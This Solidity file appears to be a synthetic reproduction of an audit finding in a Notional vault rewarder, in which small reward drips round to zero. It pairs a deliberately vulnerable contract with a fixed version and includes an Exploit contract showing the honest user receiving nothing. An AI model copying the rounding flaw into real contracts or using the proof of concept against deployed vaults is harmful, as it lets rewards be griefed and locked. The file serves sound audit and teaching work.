// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Notional VaultRewarderLib — L2 grief rounds a reward claim to zero
    (Sherlock 2024-06, finding 35119).
    SYNTHETIC, cheatcode-free reduction.
    Each claimRewardTokens is one cheap L2 reward message, modeled as a
    local call into the reward source. The audited division is
    (tokensClaimed * 1e8) / totalVaultShares. A 99-unit drip against
    100 shares rounds to 0. One hundred drips deliver N = 9900 and the
    honest user still claims 0. The control keeps the un-divided remainder,
    so the same drips pay the user 9900. */

contract RewardToken {
    string public name = "Reward";
    string public symbol = "RT";
    uint8 public decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev One call releases one L2 block's reward drip. No second chain.
contract RewardSource {
    RewardToken public token;
    uint256 public drip;

    constructor(RewardToken token_, uint256 drip_) {
        token = token_;
        drip = drip_;
    }

    function release() external returns (uint256 amount) {
        amount = drip;
        require(token.transfer(msg.sender, amount), "DRIP");
    }
}

contract VaultRewarder {
    uint256 internal constant PRECISION = 1e8;

    RewardToken public reward;
    RewardSource public source;
    uint256 public totalShares;
    uint256 public accumulated;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public paid;

    constructor(RewardToken reward_, RewardSource source_) {
        reward = reward_;
        source = source_;
    }

    function deposit(address user, uint256 wholeShares) external {
        uint256 internalShares = wholeShares * PRECISION;
        shares[user] += internalShares;
        totalShares += internalShares;
    }

    function claimRewardTokens() external {
        uint256 balancesBefore = reward.balanceOf(address(this));
        source.release();
        uint256 balanceAfter = reward.balanceOf(address(this));
        uint256 tokensClaimed = balanceAfter - balancesBefore;
        _accumulateSecondaryRewardViaClaim(tokensClaimed, totalShares);
    }

    function _accumulateSecondaryRewardViaClaim(uint256 tokensClaimed, uint256 totalVaultSharesBefore) internal {
        if (tokensClaimed == 0) return;
        accumulated += (tokensClaimed * PRECISION) / totalVaultSharesBefore; // @> VULN: drip rounds to zero
    }

    function claim(address user) external returns (uint256 amount) {
        uint256 owed = shares[user] * accumulated / PRECISION;
        amount = owed - paid[user];
        paid[user] = owed;
        if (amount != 0) require(reward.transfer(user, amount), "PAY");
        return amount;
    }
}

contract VaultRewarderFixed {
    uint256 internal constant PRECISION = 1e8;

    RewardToken public reward;
    RewardSource public source;
    uint256 public totalShares;
    uint256 public accumulated;
    uint256 public remainder;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public paid;

    constructor(RewardToken reward_, RewardSource source_) {
        reward = reward_;
        source = source_;
    }

    function deposit(address user, uint256 wholeShares) external {
        uint256 internalShares = wholeShares * PRECISION;
        shares[user] += internalShares;
        totalShares += internalShares;
    }

    function claimRewardTokens() external {
        uint256 balancesBefore = reward.balanceOf(address(this));
        source.release();
        uint256 balanceAfter = reward.balanceOf(address(this));
        uint256 tokensClaimed = balanceAfter - balancesBefore;
        uint256 scaled = tokensClaimed * PRECISION + remainder;
        uint256 delta = scaled / totalShares;
        remainder = scaled % totalShares;
        accumulated += delta;
    }

    function claim(address user) external returns (uint256 amount) {
        uint256 owed = shares[user] * accumulated / PRECISION;
        amount = owed - paid[user];
        paid[user] = owed;
        if (amount != 0) require(reward.transfer(user, amount), "PAY");
        return amount;
    }
}

contract Exploit {
    address public constant USER = 0x2222222222222222222222222222222222222222;
    uint256 public constant DRIP = 99;
    uint256 public constant ROUNDS = 100;
    uint256 public constant N = 9900;

    RewardToken public token; // CREATE nonce 1
    RewardSource public source; // CREATE nonce 2
    VaultRewarder public vault; // CREATE nonce 3

    uint256 public userGot;

    constructor() {
        token = new RewardToken();
        source = new RewardSource(token, DRIP);
        vault = new VaultRewarder(token, source);
    }

    function run() external {
        token.mint(address(source), N);
        vault.deposit(USER, 100);
        for (uint256 i = 0; i < ROUNDS; i++) {
            vault.claimRewardTokens();
        }
        userGot = vault.claim(USER);
        require(userGot == 0, "user");
        require(token.balanceOf(USER) == 0, "balance");
        require(token.balanceOf(address(vault)) == N, "stuck");
        require(vault.accumulated() == 0, "index");
    }
}
